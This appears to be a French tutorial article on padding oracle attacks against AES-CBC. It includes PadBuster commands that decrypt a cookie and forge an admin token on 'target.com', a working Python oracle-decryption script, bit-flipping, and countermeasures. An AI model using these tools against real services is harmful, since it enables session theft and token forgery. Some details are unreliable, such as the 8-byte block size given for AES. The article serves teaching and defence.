---
title: Padding Oracle Attack
domain: sciences-appliquées
subdomain: informatique / sécurité / cryptographie
tags: [padding-oracle, cbc, cryptographie, aes, déchiffrement, sécurité]
date: 2026-03-22
---

# Padding Oracle Attack

## Contexte — chiffrement par bloc en mode CBC

AES opère sur des blocs de 16 octets. En mode CBC (Cipher Block Chaining), chaque bloc de texte clair est XORé avec le bloc chiffré précédent avant d'être chiffré.

```
Chiffrement CBC :

P1 → XOR(IV) → AES_Enc → C1
P2 → XOR(C1) → AES_Enc → C2
P3 → XOR(C2) → AES_Enc → C3

Déchiffrement CBC :

C1 → AES_Dec → XOR(IV)  → P1
C2 → AES_Dec → XOR(C1)  → P2
C3 → AES_Dec → XOR(C2)  → P3
```

### Padding PKCS#7

Les données doivent être alignées sur des blocs de 16 octets. PKCS#7 complète le dernier bloc avec des octets dont la valeur est le nombre d'octets manquants.

```
16 octets de données  → pas de padding nécessaire → ajouter un bloc entier de 0x10
15 octets de données  → 1 octet   de padding : 01
14 octets de données  → 2 octets  de padding : 02 02
13 octets de données  → 3 octets  de padding : 03 03 03
...
1 octet  de données   → 15 octets de padding : 0F 0F 0F ... 0F

Validation : si le padding est invalide → erreur "padding incorrect"
```

## Principe de l'attaque

Un "oracle de padding" est un serveur qui révèle si le padding d'un message déchiffré est valide ou non (via un message d'erreur différent, un code HTTP différent, ou un temps de réponse différent).

```
L'attaquant peut :
1. Choisir un bloc chiffré C' arbitraire
2. L'envoyer au serveur qui le déchiffre
3. Observer si l'oracle dit "padding valide" ou "padding invalide"

→ En manipulant C' bit par bit, l'attaquant peut déduire le texte clair
sans connaître la clé AES
```

### Déchiffrement bit par bit

```
Pour déchiffrer le dernier octet du bloc P2 :

P2[16] = AES_Dec(C2)[16] XOR C1[16]

L'attaquant crée C1' et modifie C1'[16] jusqu'à ce que :
AES_Dec(C2)[16] XOR C1'[16] = 0x01  (padding valide d'un seul octet)

→ AES_Dec(C2)[16] = 0x01 XOR C1'[16]  (valeur connue !)
→ P2[16] = AES_Dec(C2)[16] XOR C1[16] (original)  (calculé !)

Pour le deuxième octet depuis la fin :
Régler C1'[16] pour produire 0x02
Modifier C1'[15] jusqu'à obtenir 0x02 aussi → déduire P2[15]

→ Répéter pour tous les octets du bloc → déchiffrement complet
```

## Exploitation pratique

### PadBuster — outil automatisé

```bash
# Déchiffrer un cookie/token chiffré en CBC
# PadBuster tente les 256 valeurs pour chaque octet

# Déchiffrer
padbuster https://target.com/ "COOKIE_CHIFFRE" 8 \
    -cookies "session=COOKIE_CHIFFRE" \
    -encoding 0  # 0=base64, 1=hex, 2=base64url

# Résultat : texte clair du cookie
# Exemple : "username=alice&role=user&expires=..."

# Forger un token arbitraire (chiffrement sans clé !)
padbuster https://target.com/ "COOKIE_CHIFFRE" 8 \
    -cookies "session=COOKIE_CHIFFRE" \
    -plaintext "username=admin&role=admin&expires=..."
```

### Script Python — démonstration

```python
import requests, base64

TARGET = "https://target.com/api"
BLOCK_SIZE = 16

def oracle(ciphertext: bytes) -> bool:
    """Retourne True si le padding est valide."""
    token = base64.b64encode(ciphertext).decode()
    r = requests.get(TARGET, cookies={"session": token})
    # Observer la réponse : 200 = padding valide, 403/500 = invalide
    return r.status_code == 200

def decrypt_block(prev_block: bytes, curr_block: bytes) -> bytes:
    """Déchiffre curr_block en utilisant l'oracle."""
    intermediate = bytearray(BLOCK_SIZE)  # AES_Dec(curr_block)
    plaintext = bytearray(BLOCK_SIZE)

    for pad_byte in range(1, BLOCK_SIZE + 1):
        for guess in range(256):
            # Construire un bloc précédent modifié
            crafted_prev = bytearray(BLOCK_SIZE)
            # Régler les octets déjà trouvés pour produire le bon padding
            for i in range(1, pad_byte):
                crafted_prev[BLOCK_SIZE - i] = intermediate[BLOCK_SIZE - i] ^ pad_byte
            crafted_prev[BLOCK_SIZE - pad_byte] = guess

            if oracle(bytes(crafted_prev) + curr_block):
                # AES_Dec(curr_block)[BLOCK_SIZE - pad_byte] XOR guess = pad_byte
                intermediate[BLOCK_SIZE - pad_byte] = guess ^ pad_byte
                plaintext[BLOCK_SIZE - pad_byte] = intermediate[BLOCK_SIZE - pad_byte] ^ prev_block[BLOCK_SIZE - pad_byte]
                break

    return bytes(plaintext)
```

## Variantes

### CBC Bit-Flipping

```
Propriété de CBC : modifier un bit dans Cn affecte le même bit dans Pn+1

Attaque : l'attaquant peut modifier le texte clair déchiffré sans connaître la clé
→ Si le texte clair est : "role=user&admin=false"
→ Flipper les bons bits de C1 pour obtenir : "role=admi&admin=true" dans P2

Exemple :
P2[i] = AES_Dec(C2)[i] XOR C1[i]
Pour changer P2[i] en une valeur souhaitée :
C1'[i] = C1[i] XOR P2[i] XOR target_value
→ Envoyer C1' → P2[i] est maintenant target_value
```

### POODLE (SSLv3 — padding oracle historique)

```
CVE-2014-3566 : SSLv3 CBC ne vérifiait que les derniers octets du padding
→ Les octets intermédiaires du padding pouvaient être n'importe quoi
→ L'attaquant pouvait déchiffrer un octet par requête

Exploitation : requérir un fallback vers SSLv3 via une attaque MITM
→ Déchiffrer des cookies de session

Contre-mesure : désactiver SSLv3 (fait depuis 2014 sur tous les serveurs modernes)
```

## Contre-mesures

```python
# NE PAS révéler des informations sur l'erreur de padding
# Mauvais — révèle l'état du padding
try:
    plaintext = decrypt(ciphertext)
    return {"data": plaintext}
except PaddingError:
    return {"error": "Padding incorrect"}  # ← Oracle !

# Bien — même réponse quelle que soit l'erreur
try:
    plaintext = decrypt(ciphertext)
    return {"data": plaintext}
except Exception:
    return {"error": "Déchiffrement impossible"}

# Mais la VRAIE solution : Authenticated Encryption
# Utiliser AES-GCM ou ChaCha20-Poly1305 (AEAD)
# → L'intégrité est vérifiée avant le déchiffrement
# → Pas de padding oracle possible
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

key = os.urandom(32)
aesgcm = AESGCM(key)
nonce = os.urandom(12)
ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)

# Vérification HMAC avant déchiffrement (Encrypt-then-MAC)
mac = hmac.new(mac_key, ciphertext, hashlib.sha256).digest()
# Vérifier le MAC avant de tenter de déchiffrer → rejeter si invalide
if not hmac.compare_digest(mac, received_mac):
    raise ValueError("MAC invalide")
plaintext = decrypt(ciphertext)  # Déchiffrer seulement si MAC valide
```

```
Règles :
✓ Utiliser AES-GCM ou ChaCha20-Poly1305 (AEAD) — plus de problème de padding
✓ Si CBC obligatoire : Encrypt-then-MAC (MAC sur le chiffré, pas le clair)
✓ Messages d'erreur identiques pour toutes les erreurs de déchiffrement
✓ Temps de réponse constant (pas de timing oracle)
✓ Jamais CBC sans authentification de l'intégrité
```
